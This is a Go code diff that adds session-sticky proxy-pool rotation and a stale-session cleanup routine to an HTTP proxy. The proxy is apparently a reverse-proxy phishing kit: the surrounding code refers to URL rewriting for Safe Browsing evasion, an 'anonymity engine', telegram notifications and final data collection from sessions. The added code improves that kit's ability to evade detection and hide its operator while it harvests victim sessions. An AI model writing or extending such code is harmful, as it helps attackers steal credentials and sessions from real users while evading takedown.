@@ -209,6 +209,50 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.sids = make(map[string]int)
 	p.rewrittenUrls = make(map[string]string) // Initialize URL rewriting map for Safe Browsing evasion
 
+	// Register proxy pool callbacks for session-sticky rotation
+	SetProxyPoolCallbacks(
+		// getProxyPool
+		func() *ProxyPoolConfig {
+			if p.anonymityEngine == nil || p.anonymityEngine.proxyRotator == nil {
+				return &ProxyPoolConfig{Enabled: false, Proxies: []ProxyInfo{}}
+			}
+			proxies := p.anonymityEngine.proxyRotator.GetProxyPool()
+			return &ProxyPoolConfig{
+				Enabled: p.anonymityEngine.proxyRotator.IsEnabled(),
+				Proxies: proxies,
+			}
+		},
+		// setProxyPool
+		func(pool *ProxyPoolConfig) error {
+			if p.anonymityEngine == nil || p.anonymityEngine.proxyRotator == nil {
+				return fmt.Errorf("anonymity engine not initialized")
+			}
+			p.anonymityEngine.proxyRotator.SetEnabled(pool.Enabled)
+			p.anonymityEngine.proxyRotator.SetProxyPool(pool.Proxies)
+			// Note: Proxy pool state is managed in-memory by AnonymityEngine
+			// Config persistence can be added later if needed
+			return nil
+		},
+		// getPoolStats
+		func() map[string]interface{} {
+			if p.anonymityEngine == nil || p.anonymityEngine.proxyRotator == nil {
+				return map[string]interface{}{"total": 0, "active": 0, "in_use": 0, "available": 0, "failed": 0}
+			}
+			return p.anonymityEngine.proxyRotator.GetPoolStats()
+		},
+		// testProxy
+		func(proxy *ProxyInfo) (bool, string, error) {
+			success, originIP := testProxyDirect(proxy)
+			if !success {
+				return false, "", fmt.Errorf("proxy connection failed")
+			}
+			return true, originIP, nil
+		},
+	)
+
+	// Start session janitor for stale session cleanup (releases orphaned proxies)
+	go p.startSessionJanitor()
+
 	// Start auto-notifier daemon for 100% reliable automatic telegram notifications
 	// DISABLED: OLD AUTO-NOTIFIER COMPLETELY REMOVED
 	// Using NEW SessionFinalizer instead for BULLETPROOF validation
@@ -4063,4 +4107,64 @@ func (p *HttpProxy) handleLandingPage(req *http.Request) (*http.Request, *http.R
 
 	log.Debug("[LandingPage] Served dynamic landing page for %s", req.Host)
 	return req, resp
+}
+
+// startSessionJanitor periodically cleans up stale sessions and releases their proxies
+// This prevents proxy pool exhaustion from abandoned sessions
+func (p *HttpProxy) startSessionJanitor() {
+	log.Debug("[SessionJanitor] Started - cleaning stale sessions every 5 minutes")
+
+	ticker := time.NewTicker(5 * time.Minute)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		p.cleanupStaleSessions()
+	}
+}
+
+// cleanupStaleSessions removes sessions that have been inactive for too long
+// and releases their assigned proxies back to the pool
+func (p *HttpProxy) cleanupStaleSessions() {
+	p.session_mtx.Lock()
+	defer p.session_mtx.Unlock()
+
+	staleThreshold := 30 * time.Minute // Sessions inactive for 30+ minutes are considered stale
+	now := time.Now()
+	staleCount := 0
+
+	for sid, session := range p.sessions {
+		// Check if session is done and has been inactive
+		if session.IsDone {
+			// Session is complete - check if it's been a while since completion
+			// We keep completed sessions for a bit to allow final data collection
+			sessionAge := now.Sub(session.CreateTime)
+			if sessionAge > 10*time.Minute {
+				// Release proxy if assigned
+				if session.AssignedProxy != nil && session.AssignedProxy.Host != "" && p.anonymityEngine != nil && p.anonymityEngine.proxyRotator != nil {
+					p.anonymityEngine.proxyRotator.ReleaseProxy(session.AssignedProxy.Host, session.AssignedProxy.Port)
+					log.Debug("[SessionJanitor] Released proxy %s:%d from completed session %s", session.AssignedProxy.Host, session.AssignedProxy.Port, sid)
+				}
+				delete(p.sessions, sid)
+				delete(p.sids, sid)
+				staleCount++
+			}
+		} else {
+			// Session not done - check for staleness based on session age
+			sessionAge := now.Sub(session.CreateTime)
+			if sessionAge > staleThreshold {
+				// Release proxy if assigned
+				if session.AssignedProxy != nil && session.AssignedProxy.Host != "" && p.anonymityEngine != nil && p.anonymityEngine.proxyRotator != nil {
+					p.anonymityEngine.proxyRotator.ReleaseProxy(session.AssignedProxy.Host, session.AssignedProxy.Port)
+					log.Debug("[SessionJanitor] Released proxy %s:%d from stale session %s", session.AssignedProxy.Host, session.AssignedProxy.Port, sid)
+				}
+				delete(p.sessions, sid)
+				delete(p.sids, sid)
+				staleCount++
+			}
+		}
+	}
+
+	if staleCount > 0 {
+		log.Info("[SessionJanitor] Cleaned up %d stale sessions", staleCount)
+	}
 }
